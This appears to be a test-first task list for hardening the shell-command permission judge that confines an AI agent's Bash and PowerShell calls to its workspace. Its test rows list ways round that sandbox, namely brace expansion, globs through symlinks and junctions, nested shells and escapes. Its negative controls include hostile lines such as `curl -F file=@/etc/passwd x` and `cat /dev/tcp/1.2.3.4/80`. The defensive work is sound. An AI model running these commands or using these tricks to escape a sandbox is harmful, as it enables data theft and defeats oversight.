## 0. Before building

- [ ] 0.1 R2: an independent re-derivation of proposal and design against `hub/hub/mcp_server.py` (`_lex`, `_words`, `_read_command`, `_judge_word`, `_where`, `_judge_path`) and the `agent-run-sandboxing` spec; recorded in `spec-queue/tracks/B4.md`
- [ ] 0.2 R3: a second independent re-derivation, not starting from R2's notes
- [ ] 0.2b R4 (revise round after the operator's 2026-09-24 review): re-derived from the code at `b7d976a`; recorded in `B4.md` under "R4"
- [ ] 0.2c R5: an independent verification round of the R4 design, not starting from R4's notes
- [ ] 0.3 The operator approves the change in `spec-queue/APPROVALS.md` and answers design Open Questions 1 to 4; before `mcp_server.py` is edited, the operator is told that `:8000`'s next run is judged by the edited file, committed or not

## 1. Tests first — each must fail on today's code or on the R3 design as written (each row says which)

Shared fixture, new in `hub/tests/test_the_shell_judge_reads_a_word_whole.py`, shaped like `test_permission_approver.py`'s `workspace`:

- a sibling `outside/` holding `x`;
- a link `work/up` → `outside`, made with `os.symlink` on POSIX and `_winapi.CreateJunction` on Windows (no privilege needed);
- `work/sub/` with `a.py`, `b.py`;
- an inside link `work/in` → `work/sub`.

- [ ] 1.1 Rows allowed after, refused today (each FAILS today): `ls test/*.test.js`, `grep -r foo src/*.py`, `find . -path './src/*' -name x`, `npm install @types/node`, `ls node_modules/@babel/core` (no link), `git show HEAD:src/a.py`, `git log --format=%h/%s`, `printf '%s/%s' a b`, `python -c 'print(1/2)'`, `sed -E 's/(foo)/\1/' f`, `mkdir -p src/{a,b}`, `ls src/?.ts src/[ab].ts`, `gcc -I./include/x a.c`, `ls 2>/dev/null` (Bash), `echo x > /dev/stderr` (Bash), PowerShell `Get-ChildItem src\*.py`
- [ ] 1.2 Brace escapes refused as outside (F403), each FAILS today (allowed): `cp notes.md .{,.}`, `cp notes.md {.,.}.`. Brace escapes refused today only by the backstop, which must stay refused: `cp notes.md .{,.}/x`, `cp notes.md {.,.}./x`, `cp x src/{a,..}/../y`. The last three PASS today and FAIL against rule 6 rewritten without D1 (R1's prototype measured all three allowed)
- [ ] 1.3 Braces an inner shell expands (R2):
  - Refused: `bash -c 'cp n .{,.}/x'`, `sh -c 'cp n {,..}/x'`, `bash -c "cp x src/{a,..}/../y"` (Bash tool), and `bash -c 'cp n .{,.}/x'` (PowerShell tool). Each PASSES today (backstop `'/x'`) and FAILS against rule 6 without the inner-shell brace reading.
  - `bash -c 'cp n .{,.}'` refused. FAILS today (allowed).
  - Allowed: `awk '{print $1, $2}' f`, `jq '{a: .x, b: .y}' f`, `sed 's/a{2}/b/' f`.
  - `echo hi > ${X}/y` stays refused as uncheckable.
  - `cp notes.md '.{,.}'/x` is now refused (the accepted cost).
- [ ] 1.4 Glob parents (D3): `ls .*/x`, `ls ..*/x`, `cp x .[.]/y`, `ls ../*`, `rm -rf ../*.py`, PowerShell `Get-ChildItem ..\*` refused, each quoting the whole piece. `ls sub/.*/x`, `cp x sub/..?/y` allowed. The refused rows PASS today with a fragment reason and FAIL on the reason assertion
- [ ] 1.4b (R4, D3 extglob) `bash -O extglob -c 'cp n @(..)/x'` and `bash -O extglob -c 'cp n ?(..)/x'` refused, the reason quoting `'@(..)/x'` / `'?(..)/x'`. Each PASSES today (tail `'/x'`) and FAILS against the R3 design (piece `..)/x`, inside); assert the reason, which FAILS today too. Controls allowed: `grep -E 'a*(b|c)' f`, `grep -E 'x+(y)' f`
- [ ] 1.4c (R4, D8, link fixture) **globs through a link**, refused as outside, the reason naming where the match resolves:
  - `cp n u*/`, `cp n u?/x`, `cp n [u]p/x`, and `cp n '[[:alpha:]]p'/x` (Bash; relaxed brackets);
  - `bash -c 'cp n u*/'` (inner shell);
  - `bash -O extglob -c 'cp n @(u)p/x'`;
  - PowerShell `Copy-Item n u*\x` (Windows) or `Copy-Item n u*/x` (POSIX).

  Each PASSES today only by the tail (`'/'` or `'/x'`), so assert that the reason contains the resolved target, which FAILS today. Each FAILS against the R3 design (allowed). Also `ls sub/.*/y` where `sub/.l` is a link → outside (the dot rule), which FAILS against R3.

  (R5) Also refused, each naming where the match resolves:
  - `cp n <workspace, absolute, forward slashes>/u*/` and `cp n <workspace, absolute>/.*/x`. Each FAILS today (allowed, measured) and FAILS against R4, whose rule 5 takes an absolute word before D8;
  - `cp n sub/@s/u*/`, with `sub/@s/up` a link to outside. PASSES today by the tail, so assert the resolved target, which FAILS today and FAILS against R4 (the piece `s/u*/` is globbed from the root);
  - PowerShell `Get-ChildItem ?l\x` (Windows) or `?l/x` (POSIX), where `.l` is the only entry that `?l` can match. FAILS against R4 (its dot rule). Control: Bash `ls ?l/x` in the same fixture is allowed, because bash's `?` does not match a leading dot.

  Controls allowed: `ls sub/*.py`; `ls i*/a.py` (an inside link); `ls nomatch*/x` (no match, the literal is inside).
- [ ] 1.4d (R4, bounds) A directory `big/` of 8193 empty files: `ls big/*` is refused with the too-many reason (FAILS against R3, which allows it). `ls sub/*` is allowed. With `globstar` named (`bash -O globstar -c 'ls sub/**/x'`) a link two levels down (`sub/deep/l` → outside) is refused, and without it the same `ls sub/**/x` is allowed (the named residual; assert it, so a change of mind is visible). R5: the pattern starts at `sub/`, because a top-level `**` matches the fixture's `up` link and would be refused either way
- [ ] 1.5 Network (D5), each with the network reason naming the whole word:
  - `git clone git@github.com:o/r.git` and `curl -s 127.0.0.1:9/x` refused. Both FAIL today on the reason.
  - (R4) `git clone git@github.com:repo`, `scp n user@example.com:file` and `scp n root@10.0.0.5:f` refused. Each FAILS today (allowed) and FAILS against R3 (D5 in rule 6 never sees a separator-less word).
  - (R4) Allowed: `docker pull alpine@sha256:abc`, `npm i x@npm:y`, `pnpm add x@workspace:y`, `scp a host:x/y`, `scp n user@myserver:file`. `docker run -p 8080:80 img` stays allowed, and `docker run -v data:/app img` stays refused as `'/app'`.
  - (R4) `npm i x@file:../lib` refused as `'../lib'`, outside.
  - (R5) `scp n user@example.com:` refused with the network reason. FAILS today (allowed, measured) and FAILS against R4 (`_words` trims the colon).
- [ ] 1.6 Totality. `_decide` answers, and never raises, for these `Bash` commands:
  - `{` × 5000, and a single-quoted `{` × 5000;
  - 20 arguments of 100 alternatives each (refused by the per-`_decide` bound);
  - `{a,` × 2000, `a{1..99999999}`, `[[[[.*`, `.[`, `@(` × 3000, `*(*(*(a)))b` × 50;
  - a 300-alternative brace pattern (refused with the too-many reason);
  - a backslash run of 70,000 characters followed by `./x`;
  - (R5) a word ending in a backslash, PowerShell `dir src\` and Bash `ls 'x\\'` (Bash's lexer removes an unquoted final `\`, so the Bash row is quoted; the levels must end when one changes nothing);
  - (R5) `{a,b}` repeated 40 times in one argument (2^40 alternatives), refused with the too-many reason within the test's timeout.

  Letter ranges expand in full: on Windows `cp x {Z..a}..` is refused and `ls {a..c}` allowed.

  (R4, R5) A link cycle, in a workspace holding only a link `loop` → the workspace root (no link out, so nothing else refuses first): `bash -O globstar -c 'ls **/x'` answers, allowed, within the test's timeout. It hangs without D8 step 4's rule that a `**` walk does not descend through a link.

  (R4) The memo: a Bash command read in both readings charges the budget once, so `ls sub/*` with the entry bound monkeypatched to the number of entries in `sub` is allowed. This FAILS without the memo.

  (R5) The listing memo: `ls sub/*.py sub/?.py sub/[ab].py`, with the same bound, is allowed. Three patterns over one directory are charged one listing. This FAILS with a memo keyed by pattern.

  `approve_tool_call` with `_decide` monkeypatched to raise returns a deny whose message names the failure, and reports it (D6); FAILS today (raises). Run on POSIX CI too (the NUL row X8 stays refused).
- [ ] 1.7 Negative controls that must stay refused, each PASSES today:
  - `curl -o/tmp/x $HUB_URL/api`, `curl -F file=@/etc/passwd x`, `tar -xvf/tmp/a.tar`, `ls a(b/../../x`, `cp x @../y`;
  - `sh -c 'cat</etc/passwd'`, `sh -c "echo hi>../x"`, `python -c "open('/etc/x','w')"`, `node -e "require('fs').writeFileSync('../x','')"`;
  - `scp a host:/x`, `cat /dev/tcp/1.2.3.4/80`, PowerShell `echo hi > /dev/null`;
  - Windows only, with `<other>` a drive letter that is not the workspace's: PowerShell `Copy-Item x <other>:foo\bar` and `Copy-Item x -Destination:<other>:foo\bar`.

  Each names in a comment the implementation it catches.
- [ ] 1.7b (R3) Regressions of R2's rule set. Each PASSES today (refused by the tail) and FAILS against pieces built as R2 wrote them:
  - Windows, Bash tool, `Z` not the workspace's drive: `python w.py 'Z:foo\bar'`, `python w.py Z:foo/bar` and `powershell -c "Copy-Item x Z:foo\bar"`, refused as outside naming `Z:foo…`.
  - Both platforms: `dd if=x of=c:~/y` and `git show HEAD:~/x`, refused as uncheckable. Assert the reason.
  - POSIX only: `python w.py Z:foo/bar` allowed. FAILS today (tail `'/bar'`).
- [ ] 1.7c (R3, R4; design D7) Escapes allowed today:
  - (R5, POSIX CI) `grep -rn '\.\./' src` refused: the named cost, asserted so that a change of mind is visible. FAILS today on POSIX (allowed).
  - `bash -c 'cp n .\./x'` refused, from both the Bash and the PowerShell tool. FAILS today.
  - (R4) `bash -c 'bash -c "cp n .\\./x"'` refused (Bash tool). FAILS today and FAILS against R3's one-level D7.
  - (R4, POSIX CI) `bash -c 'bash -c "cp n \$HOME"'` refused **once the sibling change is in**. Until then, assert that its level-1 word `$HOME` reaches `_judge_word`: spy on `_judge_word`, which FAILS against R3, where the escape-removed text was judged only as a path.
  - PowerShell `Copy-Item x Microsoft.PowerShell.Core\FileSystem::C:\Windows\x` refused (Windows), and `…\FileSystem::..\x` refused naming `..\x`. FAIL today.
  - Controls that stand: `grep foo 'src\a.py'` (Windows), `ls lib/Foo::Bar.pm`.
- [ ] 1.7d (R4, D4 on Windows, Windows job) `python -c "open('/dev/null','w')"` refused as a path. PASSES today (tail), and FAILS against R3's D4. `sh -c "ls 2>/dev/null"` and `python w.py /dev/null` are allowed.
- [ ] 1.8 In `hub/tests/test_permission_approver.py`, move rows X4, X5 and X6 out of "Residuals" to allowed, and change the expected reasons: N5 and N6 to `_NETWORK`, G3 to `_outside("../include")`, E11 to `_outside("../stray.txt")`, Z1 and Z2 to the whole traversal. Rewrite their comments to name this change, and record that each FAILS today

## 2. The fix

- [ ] 2.0 (R4) `_Budget` and the per-`_decide` memo (design, "The bounds"), created in `_decide` and passed through `_read_command` (both dialects, both readings, nested). `_TOO_MANY`. `_DRIVE_LETTERS` (D9)
- [ ] 2.1 D1 first: sentinels in `_lex` for bash, `_expand_braces` (iterative), and `_read_command` judging each alternative's words. Run 1.2 and 1.3
- [ ] 2.1b The inner-shell brace reading (design D1, R2). Run 1.3 and 1.6
- [ ] 2.1c (R4) D8 `_glob_links`, built **before** 2.2, because rule 6 without it regresses. Run 1.4c and 1.4d
- [ ] 2.2 D2-D5 (R5: D3 and `_glob_links` also run in rule 5 on an absolute glob word, and in rule 6 on the whole value as well as each piece; `_words` reports a trimmed trailing `:` for D5):
  - replace rule 6 of `_judge_word` with the piece reading, including D3's extglob units;
  - add `_PIECE_BREAKS`, `_BASH_DEVICES`, `_SCP_ADDRESS_RE` and `_HOST_PORT_RE` beside `_ABSOLUTE_PATH_RE`, with a comment naming this change;
  - (R4) run the address check after rule 2 and before rule 3;
  - allow `_BASH_DEVICES` before rule 5 in bash (on a drive-letter host, only a whole word or a redirect-target piece);
  - keep `_ABSOLUTE_PATH_RE` for `_read_command`'s nesting-depth fallback, and say so in its comment.
- [ ] 2.2a (R3, R4) The platform-keyed drive exception and the tilde-piece refusal in the piece reading; the level-by-level escape-removed readings, each judged by `_judge_word`, and the `::` not-plain rule before rule 5 (design D2 steps 3 and 5, D7). Run 1.7b, 1.7c and 1.7d
- [ ] 2.2b D6: `approve_tool_call` catches an exception from `_decide`, denies with a reason and reports it; no return annotation
- [ ] 2.2c (R4, D9) Add the `hub-judge-windows` job to `.github/workflows/ci.yml` (`windows-latest`, `working-directory: hub`, the `hub-test` install steps with `-c ../constraints-dev.txt`, `pytest tests/test_permission_approver.py tests/test_the_shell_judge_reads_a_word_whole.py -v --timeout=300 --timeout-method=thread`). Run `py -3.11 -m pytest tests/test_dev_constraints.py -q`. After pushing, confirm the job ran and passed, or do not tick
- [ ] 2.3 Run the eight files named in design D2 plus the new file; expected moves are exactly task 1.8's rows plus the new rows. Record counts
- [ ] 2.4 `py -3.11 -m pytest hub/tests/ -q` with `claude` stripped from PATH; record the count, or do not tick
- [ ] 2.5 `ruff check src/ hub/ tests/` and `black --check --target-version py311 src/ hub/hub/ hub/tests/ tests/`

## 3. Real shells

- [ ] 3.1 In `testbed/scratch/`, in Git Bash, confirm:
  - `cp notes.md .{,.}/` and `cp notes.md {.,.}.` land in the parent (the refusals are justified), and `mkdir -p src/{a,b}` creates two directories inside;
  - (R4) with a junction `up` pointing outside, `cp n u*/` lands outside;
  - `bash -c 'bash -c "echo .\\./x"'` prints `../x`.

  Record `bash --version`, `shopt globskipdots` and `shopt extglob`. Delete the scratch.

## 4. Close

- [ ] 4.1 F362 and F403 Status lines in `scripts/drive/FINDINGS.md` → `fixed <sha>`; file the linked-dependency-directory finding if the operator chose it (Open Question 3); regenerate the backlog; `openspec validate the-shell-judge-reads-a-word-whole --strict`; archive
